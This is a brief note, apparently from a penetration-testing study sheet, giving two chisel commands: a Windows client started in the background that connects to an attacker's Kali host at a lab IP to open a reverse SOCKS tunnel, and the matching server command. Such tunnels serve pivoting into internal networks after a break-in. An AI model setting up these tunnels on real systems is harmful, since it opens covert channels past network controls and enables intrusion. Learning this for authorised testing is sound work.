start /b chisel.exe client 192.168.45.161:8080 R:socks

::This command will start the chisel client on background to not block the current session shell.


./chisel server -p 8080 --reverse
::This command on our Kali will open the HTTP tunel through port 8080.
